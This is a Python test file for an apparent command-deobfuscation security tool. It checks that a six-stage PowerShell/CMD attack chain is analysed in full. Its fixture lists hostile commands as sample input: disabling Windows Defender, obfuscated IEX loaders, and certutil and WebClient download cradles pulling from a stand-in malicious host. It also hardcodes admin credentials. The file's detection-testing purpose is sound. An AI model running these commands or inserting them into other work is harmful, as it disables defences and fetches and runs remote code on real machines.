"""Regression: multi-line plain-text command chain is analysed as a chain,
not silently truncated to the first line.

Reproduces the Feb-2026 user report:
    "The tool only considered the plaintext commandline in INPUT box not
     the chain — 11 lines pasted, only line 1 got analyzed."

The frontend now auto-splits multi-command input at the entry points
(AUTO INVESTIGATE / DECODE / NIVXRAY DECODE) and routes to /api/decode/chain
so every stage's IOCs / MITRE / LOLBAS reach the top-level Attack Graph.

This suite verifies the *backend* half — /api/decode/chain still returns a
correct aggregate for the exact user payload, so the frontend routing does
not need to change anything on the server side.
"""
import pytest
import requests

BASE_URL = ""
with open("/app/frontend/.env") as f:
    for line in f:
        if line.startswith("REACT_APP_BACKEND_URL="):
            BASE_URL = line.split("=", 1)[1].strip().rstrip("/")
assert BASE_URL, "REACT_APP_BACKEND_URL missing"

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "NivXRay#2026!"


# The exact 6-stage chain from the user's Feb-2026 report — 11 raw lines
# grouped into 6 logical PowerShell / CMD stages by the frontend splitter.
USER_STAGES = [
    'powershell -w hidden -c "sc.exe stop WinDefend"',
    "powershell -nop -w hidden -c \"$h='73632e6578652073746f702057696e446566656e64';"
    "$c=[regex]::matches($h,'..')|%{$_.value};"
    "$f=($c|%{[char][int]('0x'+$_)})-join'';iex $f\"",
    "cmd.exe /c certutil.exe -urlcache -f http://malicious-domain.com %temp%\\p.exe",
    "(New-Object Net.WebClient).DownloadString('http://127.0.0')",
    "powershell -NoP -C \"IEX (([string[]]('1sp.s/1.0.0.721//:ptth',"
    "'(tneilCbeW.teN tcejbO-weN)')[1..0] |% "
    "{$e=$_;$r='';for($i=$e.Length-1;$i -ge 0;$i-- ){$r+=$e[$i]};$r}) "
    "-join '.DownloadString')\"",
    'powershell -NoProfile -WindowStyle Hidden -Command "IO.Compression.GzipStream"\n'
    "$b='H4sICG06mFwCA2NvZGUAc0vNKy7PL8pJUQQAlp9pDwwAAAA=';\n"
    "$m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b));\n"
    "$g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress);\n"
    "$r=New-Object IO.StreamReader($g);\n"
    "IEX $r.ReadToEnd();",
]


@pytest.fixture(scope="module")
def auth():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
                      timeout=30)
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def test_chain_endpoint_processes_all_6_stages(auth):
    """The top-level regression: /api/decode/chain must return exactly 6
    stages when fed the user's 6-line plain-text attack chain — no
    truncation, no silent drop, no first-line-only shortcut."""
    r = requests.post(
        f"{BASE_URL}/api/decode/chain",
        headers=auth,
        json={"stages": [{"input": s} for s in USER_STAGES]},
        timeout=60,
    )
    assert r.status_code == 200, r.text
    d = r.json()
    assert d.get("stage_count") == 6, f"expected 6 stages, got {d.get('stage_count')}"
    assert len(d.get("stages") or []) == 6


def test_aggregate_identifies_malicious_downloader_family(auth):
    """Family attribution + malicious verdict must survive across the whole
    chain — even when individual lines look benign in isolation."""
    r = requests.post(
        f"{BASE_URL}/api/decode/chain",
        headers=auth,
        json={"stages": [{"input": s} for s in USER_STAGES]},
        timeout=60,
    )
    d = r.json()
    agg = d.get("aggregate") or {}
    fam = (agg.get("family") or {}).get("family") or ""
    assert "PowerShell" in fam and "Downloader" in fam, f"family attribution missing: {fam}"
    verdict = (agg.get("risk") or {}).get("verdict")
    assert verdict == "Malicious", f"expected Malicious, got {verdict}"


def test_aggregate_iocs_merged_across_stages(auth):
    """URLs, IPs, and domains from stages 3+4+5 must all appear in the
    top-level merged IOC set — this was the exact bug: line-1-only decode
    lost the certutil URL, the WebClient URL, and the reversed URL."""
    r = requests.post(
        f"{BASE_URL}/api/decode/chain",
        headers=auth,
        json={"stages": [{"input": s} for s in USER_STAGES]},
        timeout=60,
    )
    d = r.json()
    iocs = (d.get("aggregate") or {}).get("iocs") or {}
    urls = iocs.get("urls") or []
    domains = iocs.get("domains") or []
    # stage 2 (index 2): http://malicious-domain.com
    assert any("malicious-domain.com" in u for u in urls), f"missing malicious-domain.com in {urls}"
    # stage 3 (index 3): 127.0.0 (partial IP that becomes a URL host)
    assert any("127.0.0" in u for u in urls), f"missing 127.0.0 URL in {urls}"
    # Domain rollup catches the same
    assert any("malicious-domain.com" in dom for dom in domains), f"missing domain in {domains}"


def test_aggregate_mitre_covers_execution_and_defense_evasion(auth):
    """Kill-chain must span multiple tactics — Execution (PowerShell/CMD),
    Defense Evasion (Impair Defenses / Deobfuscate), Command-and-Control
    (Ingress Tool Transfer). Line-1-only decode would only catch T1059.001."""
    r = requests.post(
        f"{BASE_URL}/api/decode/chain",
        headers=auth,
        json={"stages": [{"input": s} for s in USER_STAGES]},
        timeout=60,
    )
    d = r.json()
    mitre = (d.get("aggregate") or {}).get("mitre") or []
    tactics = {(m.get("tactic") or "").lower() for m in mitre}
    tech_ids = {m.get("id") for m in mitre}
    assert "execution" in tactics, f"tactics missing execution: {tactics}"
    assert "defense evasion" in tactics, f"tactics missing defense evasion: {tactics}"
    # T1140 (Deobfuscate/Decode Files) from certutil + T1105 (Ingress Tool
    # Transfer) from certutil/WebClient MUST be present.
    assert "T1140" in tech_ids, f"T1140 (Deobfuscate) missing: {tech_ids}"
    assert "T1105" in tech_ids, f"T1105 (Ingress Tool Transfer) missing: {tech_ids}"


def test_aggregate_lolbins_include_certutil_and_powershell(auth):
    """LOLBAS rollup must span multiple binaries — a line-1-only decode
    would report only powershell.exe and miss certutil + cmd."""
    r = requests.post(
        f"{BASE_URL}/api/decode/chain",
        headers=auth,
        json={"stages": [{"input": s} for s in USER_STAGES]},
        timeout=60,
    )
    d = r.json()
    lolbas = (d.get("aggregate") or {}).get("lolbas") or []
    binaries = {l.get("binary") for l in lolbas}
    assert "powershell.exe" in binaries, f"powershell.exe missing: {binaries}"
    assert "certutil.exe" in binaries, f"certutil.exe missing: {binaries}"
    assert "cmd.exe" in binaries, f"cmd.exe missing: {binaries}"


def test_backward_compat_single_line_unchanged(auth):
    """Single-command input must NOT trigger any chain-routing side-effect
    server-side. /api/decode/smart on a lone command still returns the
    normal flat-decode result (this test guards against a future accidental
    breakage of the classic hot path)."""
    r = requests.post(
        f"{BASE_URL}/api/decode/smart",
        headers=auth,
        json={"input": 'powershell -w hidden -c "sc.exe stop WinDefend"'},
        timeout=30,
    )
    assert r.status_code == 200, r.text
    d = r.json()
    assert d.get("engine")
    # Flat single-line decode returns exactly one output blob — no `stages`.
    assert "stage_count" not in d
    assert "stages" not in d
